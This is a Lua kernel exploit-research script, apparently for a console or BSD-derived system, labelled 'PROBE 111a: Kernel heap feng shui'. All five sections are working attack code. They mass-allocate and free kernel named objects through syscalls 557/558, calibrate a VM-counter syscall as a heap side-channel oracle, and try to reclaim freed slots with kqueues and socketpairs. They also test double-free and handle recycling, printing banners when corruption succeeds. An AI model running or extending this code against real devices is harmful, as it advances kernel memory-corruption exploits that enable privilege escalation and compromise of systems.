-- CRASH_CLASS: MODERATE
-- PROBE 111a: Kernel heap feng shui via sys 557/558 + sys 624 VM oracle
--
-- Context: sys 557 (namedobj_create) allocates kernel objects on demand.
-- sys 558 (namedobj_delete) frees them by handle+type — NO priv_check.
-- sys 624 is a confirmed VM operation counter (+5 per mmap, zero jitter).
--
-- Combined: controlled kernel heap allocator/deallocator for heap feng shui.
-- The oracle (sys 624) tells us exactly how many kernel VM ops happened.
--
-- 88a/96a test reachability and type confusion. THIS probe tests:
-- A = sys 557 mass allocation (200 handles, measure sys 624 counter delta)
-- B = sys 558 targeted deletion (sequential, random, every-other patterns)
-- C = cross-type allocation in freed slots (kqueue + socketpair after deletes)
-- D = sys 624 as heap-op oracle (measure counter per-op granularity)
-- E = double-free test (delete same handle twice via sys 558)
--
-- TEST_SECTION controls which section runs:
--   "A" = mass creation + counter      (LOW risk)
--   "B" = deletion patterns             (LOW risk)
--   "C" = cross-type allocation         (MODERATE risk)
--   "D" = sys 624 oracle calibration    (LOW risk)
--   "E" = double-free                   (MODERATE risk)

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 111a: KERNEL HEAP FENG SHUI ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc557 = make_syscall(557)   -- namedobj_create
local sc558 = make_syscall(558)   -- namedobj_delete
local sc624 = make_syscall(624)   -- VM operation counter
local sc362 = make_syscall(362)   -- kqueue
local sc135 = make_syscall(135)   -- socketpair
local sc6   = make_syscall(6)     -- close
local sc477 = make_syscall(477)   -- mmap

local function read_counter_624()
    local ok, val = pcall(function() return sc624() end)
    if ok then return to_num(val) else return nil end
end

-- ======================================================
-- SECTION A: Mass handle creation + sys 624 counter
-- ======================================================
if TEST_SECTION == "A" then
    print("--- SECTION A: sys 557 mass allocation + sys 624 oracle ---")
    print("")

    local counter_before = read_counter_624()
    print("[A] sys 624 counter before: " .. tostring(counter_before))

    local handles = {}
    local create_ok = 0
    local create_fail = 0
    local st = memory.alloc(0x200)

    for i = 0, 199 do
        safe_wd(st, 0x160)
        for j = 4, 0x15C, 4 do safe_wd(st + j, 0) end

        local ok, ret = pcall(function()
            return sc557(uint64(0), uint64(st))
        end)
        local rv = ok and to_num(ret) or -999

        if rv >= 0 and rv ~= 0xFFFFFFFF then
            create_ok = create_ok + 1
            handles[#handles + 1] = rv
        else
            create_fail = create_fail + 1
        end

        if i < 5 or i == 99 or i == 199 then
            print(string.format("[A] create #%d: ok=%s ret=%d", i, tostring(ok), rv))
        end
    end

    local counter_after = read_counter_624()
    print("")
    print("[A] Created " .. create_ok .. " handles, failed " .. create_fail)
    print("[A] sys 624 counter after: " .. tostring(counter_after))
    if counter_before and counter_after then
        local delta = counter_after - counter_before
        print("[A] sys 624 delta: " .. delta)
        if create_ok > 0 then
            print("[A] delta-per-create: " .. string.format("%.2f", delta / create_ok))
        end
    end

    print("")
    print("[A] Handle values (first 20):")
    for i = 1, math.min(20, #handles) do
        print(string.format("  handle[%d] = %d (0x%X)", i, handles[i], handles[i]))
    end

    if #handles > 20 then
        print("  ... (" .. (#handles - 20) .. " more)")
        print(string.format("  handle[last] = %d (0x%X)", handles[#handles], handles[#handles]))
    end

    -- Check if handles are sequential
    if #handles >= 2 then
        local sequential = true
        for i = 2, #handles do
            if handles[i] ~= handles[i-1] + 1 then
                sequential = false
                break
            end
        end
        print("[A] Handles sequential: " .. tostring(sequential))
        if sequential then
            print("[A] Range: " .. handles[1] .. " - " .. handles[#handles])
        end
    end

    -- Read back the struct after last create to see what kernel put there
    print("")
    print("[A] Last struct dump (first 64 bytes):")
    local hex = {}
    for off = 0, 63 do
        local b = safe_rd(st + off)
        if b then
            hex[#hex + 1] = string.format("%02X", b % 256)
        else
            hex[#hex + 1] = "??"
        end
        if #hex == 16 then
            print("  +" .. string.format("%02X", off - 15) .. ": " .. table.concat(hex, " "))
            hex = {}
        end
    end


-- ======================================================
-- SECTION B: Targeted deletion via sys 558
-- ======================================================
elseif TEST_SECTION == "B" then
    print("--- SECTION B: sys 558 deletion patterns ---")
    print("")

    local st = memory.alloc(0x200)
    local handles = {}

    -- First create 50 handles
    print("[B] Creating 50 handles via sys 557...")
    for i = 0, 49 do
        safe_wd(st, 0x160)
        for j = 4, 0x5C, 4 do safe_wd(st + j, 0) end

        local ok, ret = pcall(function() return sc557(uint64(0), uint64(st)) end)
        local rv = ok and to_num(ret) or -999
        if rv >= 0 and rv ~= 0xFFFFFFFF then
            handles[#handles + 1] = rv
        end
    end
    print("[B] Created " .. #handles .. " handles")
    if #handles < 10 then
        print("[B] Not enough handles, aborting")
        print("=== PROBE 111a COMPLETE ===")
        return
    end

    local counter_before = read_counter_624()
    print("[B] sys 624 before deletions: " .. tostring(counter_before))

    -- B1: Delete first 10 sequentially (type 0)
    print("")
    print("[B1] Sequential delete: handles 1-10, type=0")
    local del_ok = 0
    local del_fail = 0
    for i = 1, 10 do
        local ok, ret = pcall(function()
            return sc558(uint64(handles[i]), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        if rv == 0 then
            del_ok = del_ok + 1
        else
            del_fail = del_fail + 1
        end
        if i <= 3 then
            print(string.format("  delete handle %d: ok=%s ret=%d", handles[i], tostring(ok), rv))
        end
    end
    print(string.format("[B1] Deleted %d/%d (ok=%d fail=%d)", del_ok + del_fail, 10, del_ok, del_fail))

    -- B2: Delete every-other from 11-30
    print("")
    print("[B2] Every-other delete: handles 11,13,15,...29")
    del_ok = 0
    del_fail = 0
    for i = 11, 30, 2 do
        if i <= #handles then
            local ok, ret = pcall(function()
                return sc558(uint64(handles[i]), uint64(0))
            end)
            local rv = ok and to_num(ret) or -999
            if rv == 0 then del_ok = del_ok + 1 else del_fail = del_fail + 1 end
        end
    end
    print(string.format("[B2] Deleted %d (ok=%d fail=%d)", del_ok + del_fail, del_ok, del_fail))

    -- B3: Try different type values for deletion
    print("")
    print("[B3] Type-varied delete: handle 31-40 with types 0,1,0x100,0x110,0x120,0x160,0x1000,0xFFFF,0x10000,0")
    local types_to_try = {0, 1, 0x100, 0x110, 0x120, 0x160, 0x1000, 0xFFFF, 0x10000, 0}
    for i = 31, math.min(40, #handles) do
        local t = types_to_try[i - 30] or 0
        local ok, ret = pcall(function()
            return sc558(uint64(handles[i]), uint64(t))
        end)
        local rv = ok and to_num(ret) or -999
        print(string.format("  handle %d type=0x%X: ok=%s ret=%d", handles[i], t, tostring(ok), rv))
    end

    local counter_after = read_counter_624()
    print("")
    print("[B] sys 624 after deletions: " .. tostring(counter_after))
    if counter_before and counter_after then
        print("[B] sys 624 delta: " .. (counter_after - counter_before))
    end


-- ======================================================
-- SECTION C: Cross-type allocation in freed slots
-- ======================================================
elseif TEST_SECTION == "C" then
    print("--- SECTION C: Cross-type allocation in freed slots ---")
    print("")

    local st = memory.alloc(0x200)
    local handles = {}

    -- Create 30 namedobj handles
    print("[C] Phase 1: Create 30 handles via sys 557...")
    for i = 0, 29 do
        safe_wd(st, 0x160)
        for j = 4, 0x5C, 4 do safe_wd(st + j, 0) end

        local ok, ret = pcall(function() return sc557(uint64(0), uint64(st)) end)
        local rv = ok and to_num(ret) or -999
        if rv >= 0 and rv ~= 0xFFFFFFFF then
            handles[#handles + 1] = rv
        end
    end
    print("[C] Created " .. #handles .. " handles")

    if #handles < 20 then
        print("[C] Not enough, aborting")
        print("=== PROBE 111a COMPLETE ===")
        return
    end

    -- Delete 10 of them to create holes
    print("")
    print("[C] Phase 2: Delete handles 6-15 (create holes)...")
    local deleted = {}
    for i = 6, 15 do
        local ok, ret = pcall(function()
            return sc558(uint64(handles[i]), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        print(string.format("  delete handle %d: ret=%d", handles[i], rv))
        if rv == 0 then deleted[#deleted + 1] = handles[i] end
    end
    print("[C] Deleted " .. #deleted .. " handles")

    local counter_mid = read_counter_624()
    print("[C] sys 624 after delete phase: " .. tostring(counter_mid))

    -- Phase 3: Allocate kqueues in the freed slots
    print("")
    print("[C] Phase 3: Allocate 10 kqueues (should land in freed slots)...")
    local kq_fds = {}
    for i = 1, 10 do
        local ok, ret = pcall(function() return sc362() end)
        local rv = ok and to_num(ret) or -999
        print(string.format("  kqueue #%d: ret=%d", i, rv))
        if rv >= 0 then kq_fds[#kq_fds + 1] = rv end
    end

    -- Phase 4: Allocate socketpairs
    print("")
    print("[C] Phase 4: Allocate 5 socketpairs (AF_LOCAL)...")
    local sp_buf = memory.alloc(16)
    local sp_fds = {}
    for i = 1, 5 do
        safe_wd(sp_buf, 0)
        safe_wd(sp_buf + 4, 0)
        local ok, ret = pcall(function()
            return sc135(uint64(1), uint64(1), uint64(0), uint64(sp_buf))
        end)
        local rv = ok and to_num(ret) or -999
        local fd_a = safe_rd(sp_buf) or -1
        local fd_b = safe_rd(sp_buf + 4) or -1
        print(string.format("  socketpair #%d: ret=%d fds=[%d, %d]", i, rv, fd_a, fd_b))
        if rv == 0 then
            sp_fds[#sp_fds + 1] = {fd_a, fd_b}
        end
    end

    local counter_after = read_counter_624()
    print("")
    print("[C] sys 624 after cross-alloc: " .. tostring(counter_after))
    if counter_mid and counter_after then
        print("[C] sys 624 delta from cross-alloc: " .. (counter_after - counter_mid))
    end

    -- Phase 5: Now try to access the DELETED namedobj handles
    -- If kqueue/socketpair landed in the freed kernel heap slots, these
    -- deleted handles might resolve to kqueue/socketpair kernel structs
    print("")
    print("[C] Phase 5: Try sys 558 on already-deleted handles (should fail if clean)...")
    for i = 1, math.min(5, #deleted) do
        local ok, ret = pcall(function()
            return sc558(uint64(deleted[i]), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        print(string.format("  re-delete handle %d: ok=%s ret=%d%s",
            deleted[i], tostring(ok), rv,
            rv == 0 and " *** DOUBLE-FREE SUCCEEDED ***" or ""))
    end

    -- Cleanup: close kqueue fds
    print("")
    print("[C] Cleanup: closing kqueue fds...")
    for i = 1, #kq_fds do
        pcall(function() sc6(uint64(kq_fds[i])) end)
    end
    for i = 1, #sp_fds do
        pcall(function() sc6(uint64(sp_fds[i][1])) end)
        pcall(function() sc6(uint64(sp_fds[i][2])) end)
    end


-- ======================================================
-- SECTION D: sys 624 oracle calibration
-- ======================================================
elseif TEST_SECTION == "D" then
    print("--- SECTION D: sys 624 VM op oracle calibration ---")
    print("")

    -- Measure counter delta for various kernel operations
    local ops = {}

    -- D1: mmap (known: +5 per mmap)
    print("[D1] mmap calibration (5 rounds):")
    for i = 1, 5 do
        local c1 = read_counter_624()
        local ok, ret = pcall(function()
            return sc477(uint64(0), uint64(0x4000), uint64(3),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)
        local c2 = read_counter_624()
        local rv = ok and to_num(ret) or -999
        local delta = (c1 and c2) and (c2 - c1) or -1
        print(string.format("  mmap #%d: ret=0x%X delta=%d", i, rv, delta))
        ops[#ops + 1] = {"mmap", delta}
    end

    -- D2: kqueue
    print("")
    print("[D2] kqueue calibration (5 rounds):")
    for i = 1, 5 do
        local c1 = read_counter_624()
        local ok, ret = pcall(function() return sc362() end)
        local c2 = read_counter_624()
        local rv = ok and to_num(ret) or -999
        local delta = (c1 and c2) and (c2 - c1) or -1
        print(string.format("  kqueue #%d: fd=%d delta=%d", i, rv, delta))
        ops[#ops + 1] = {"kqueue", delta}
        if rv >= 0 then pcall(function() sc6(uint64(rv)) end) end
    end

    -- D3: socketpair
    print("")
    print("[D3] socketpair calibration (5 rounds):")
    local sp_buf = memory.alloc(16)
    for i = 1, 5 do
        safe_wd(sp_buf, 0)
        safe_wd(sp_buf + 4, 0)
        local c1 = read_counter_624()
        local ok, ret = pcall(function()
            return sc135(uint64(1), uint64(1), uint64(0), uint64(sp_buf))
        end)
        local c2 = read_counter_624()
        local rv = ok and to_num(ret) or -999
        local delta = (c1 and c2) and (c2 - c1) or -1
        local fa = safe_rd(sp_buf) or -1
        local fb = safe_rd(sp_buf + 4) or -1
        print(string.format("  socketpair #%d: ret=%d fds=[%d,%d] delta=%d", i, rv, fa, fb, delta))
        ops[#ops + 1] = {"socketpair", delta}
        if rv == 0 then
            pcall(function() sc6(uint64(fa)) end)
            pcall(function() sc6(uint64(fb)) end)
        end
    end

    -- D4: sys 557 create
    print("")
    print("[D4] sys 557 create calibration (5 rounds):")
    local st = memory.alloc(0x200)
    for i = 1, 5 do
        safe_wd(st, 0x160)
        for j = 4, 0x5C, 4 do safe_wd(st + j, 0) end

        local c1 = read_counter_624()
        local ok, ret = pcall(function() return sc557(uint64(0), uint64(st)) end)
        local c2 = read_counter_624()
        local rv = ok and to_num(ret) or -999
        local delta = (c1 and c2) and (c2 - c1) or -1
        print(string.format("  557 create #%d: ret=%d delta=%d", i, rv, delta))
        ops[#ops + 1] = {"557_create", delta}
    end

    -- D5: sys 558 delete
    print("")
    print("[D5] sys 558 delete calibration (5 rounds, create+delete pairs):")
    for i = 1, 5 do
        safe_wd(st, 0x160)
        for j = 4, 0x5C, 4 do safe_wd(st + j, 0) end

        local ok1, ret1 = pcall(function() return sc557(uint64(0), uint64(st)) end)
        local handle = ok1 and to_num(ret1) or -1
        if handle >= 0 then
            local c1 = read_counter_624()
            local ok2, ret2 = pcall(function()
                return sc558(uint64(handle), uint64(0))
            end)
            local c2 = read_counter_624()
            local rv = ok2 and to_num(ret2) or -999
            local delta = (c1 and c2) and (c2 - c1) or -1
            print(string.format("  558 delete #%d: handle=%d ret=%d delta=%d", i, handle, rv, delta))
            ops[#ops + 1] = {"558_delete", delta}
        else
            print(string.format("  558 delete #%d: create failed (ret=%d)", i, handle))
        end
    end

    -- D6: close(fd)
    print("")
    print("[D6] close(fd) calibration (5 kqueue fds):")
    for i = 1, 5 do
        local ok1, fd = pcall(function() return sc362() end)
        local fdv = ok1 and to_num(fd) or -1
        if fdv >= 0 then
            local c1 = read_counter_624()
            local ok2 = pcall(function() sc6(uint64(fdv)) end)
            local c2 = read_counter_624()
            local delta = (c1 and c2) and (c2 - c1) or -1
            print(string.format("  close #%d: fd=%d delta=%d", i, fdv, delta))
            ops[#ops + 1] = {"close_kq", delta}
        end
    end

    -- Summary
    print("")
    print("[D] === ORACLE CALIBRATION SUMMARY ===")
    local by_type = {}
    for _, op in ipairs(ops) do
        if not by_type[op[1]] then by_type[op[1]] = {} end
        by_type[op[1]][#by_type[op[1]] + 1] = op[2]
    end
    for name, deltas in pairs(by_type) do
        local sum = 0
        local min_d = 999999
        local max_d = -999999
        for _, d in ipairs(deltas) do
            sum = sum + d
            if d < min_d then min_d = d end
            if d > max_d then max_d = d end
        end
        local avg = sum / #deltas
        print(string.format("  %-15s avg=%.1f min=%d max=%d jitter=%d n=%d",
            name, avg, min_d, max_d, max_d - min_d, #deltas))
    end


-- ======================================================
-- SECTION E: Double-free test via sys 558
-- ======================================================
elseif TEST_SECTION == "E" then
    print("--- SECTION E: sys 558 double-free test ---")
    print("")

    local st = memory.alloc(0x200)

    -- Create 5 handles
    local handles = {}
    for i = 1, 5 do
        safe_wd(st, 0x160)
        for j = 4, 0x5C, 4 do safe_wd(st + j, 0) end

        local ok, ret = pcall(function() return sc557(uint64(0), uint64(st)) end)
        local rv = ok and to_num(ret) or -999
        if rv >= 0 and rv ~= 0xFFFFFFFF then
            handles[#handles + 1] = rv
            print(string.format("[E] Created handle %d", rv))
        end
    end

    if #handles < 3 then
        print("[E] Not enough handles, aborting")
        print("=== PROBE 111a COMPLETE ===")
        return
    end

    -- E1: Normal delete then double-delete same handle
    print("")
    print("[E1] Delete handle " .. handles[1] .. " once (should succeed):")
    local ok1, ret1 = pcall(function()
        return sc558(uint64(handles[1]), uint64(0))
    end)
    print(string.format("  first delete: ok=%s ret=%d", tostring(ok1), ok1 and to_num(ret1) or -999))

    print("[E1] Delete handle " .. handles[1] .. " AGAIN (double-free test):")
    local ok2, ret2 = pcall(function()
        return sc558(uint64(handles[1]), uint64(0))
    end)
    local rv2 = ok2 and to_num(ret2) or -999
    print(string.format("  second delete: ok=%s ret=%d", tostring(ok2), rv2))
    if rv2 == 0 then
        print("  *** DOUBLE-FREE SUCCEEDED — kernel freed same object twice ***")
    else
        print("  Double-free blocked (expected: -1 or error)")
    end

    -- E2: Delete with wrong type, then correct type
    print("")
    print("[E2] Delete handle " .. handles[2] .. " with wrong type 0x120 (semaphore):")
    local ok3, ret3 = pcall(function()
        return sc558(uint64(handles[2]), uint64(0x120))
    end)
    print(string.format("  wrong-type delete: ok=%s ret=%d", tostring(ok3), ok3 and to_num(ret3) or -999))

    print("[E2] Now delete handle " .. handles[2] .. " with type 0:")
    local ok4, ret4 = pcall(function()
        return sc558(uint64(handles[2]), uint64(0))
    end)
    print(string.format("  correct-type delete: ok=%s ret=%d", tostring(ok4), ok4 and to_num(ret4) or -999))

    -- E3: Create-delete-create cycle — does handle get recycled?
    print("")
    print("[E3] Handle recycling test:")
    local recycled = {}
    for round = 1, 10 do
        safe_wd(st, 0x160)
        for j = 4, 0x5C, 4 do safe_wd(st + j, 0) end

        local ok_c, ret_c = pcall(function() return sc557(uint64(0), uint64(st)) end)
        local h = ok_c and to_num(ret_c) or -1
        if h >= 0 and h ~= 0xFFFFFFFF then
            pcall(function() sc558(uint64(h), uint64(0)) end)
            recycled[#recycled + 1] = h
        end
    end
    print("  Handles created-then-deleted:")
    for i, h in ipairs(recycled) do
        print(string.format("    round %d: handle=%d", i, h))
    end

    -- Check for recycling
    local seen = {}
    local dups = 0
    for _, h in ipairs(recycled) do
        if seen[h] then dups = dups + 1 end
        seen[h] = true
    end
    print(string.format("[E3] Unique handles: %d, duplicates: %d", #recycled - dups, dups))
    if dups > 0 then
        print("  *** HANDLE RECYCLING CONFIRMED — freed handles reused ***")
    end

    -- E4: Allocate between deletes to test slot reuse
    print("")
    print("[E4] Interleaved create-delete-create (same slot reuse test):")
    safe_wd(st, 0x160)
    for j = 4, 0x5C, 4 do safe_wd(st + j, 0) end
    local ok_a, ret_a = pcall(function() return sc557(uint64(0), uint64(st)) end)
    local h_a = ok_a and to_num(ret_a) or -1
    print(string.format("  create A: handle=%d", h_a))

    if h_a >= 0 then
        pcall(function() sc558(uint64(h_a), uint64(0)) end)
        print(string.format("  delete A: handle=%d", h_a))
    end

    safe_wd(st, 0x160)
    for j = 4, 0x5C, 4 do safe_wd(st + j, 0) end
    local ok_b, ret_b = pcall(function() return sc557(uint64(0), uint64(st)) end)
    local h_b = ok_b and to_num(ret_b) or -1
    print(string.format("  create B: handle=%d", h_b))

    if h_a >= 0 and h_b >= 0 then
        if h_b == h_a then
            print("  *** SAME HANDLE REUSED — slot recycling confirmed ***")
        else
            print("  Different handle: no immediate slot reuse")
        end
    end

    -- Cleanup
    if h_b >= 0 and h_b ~= 0xFFFFFFFF then
        pcall(function() sc558(uint64(h_b), uint64(0)) end)
    end

else
    print("Unknown section: " .. TEST_SECTION)
end

print("")
print("=== PROBE 111a COMPLETE ===")
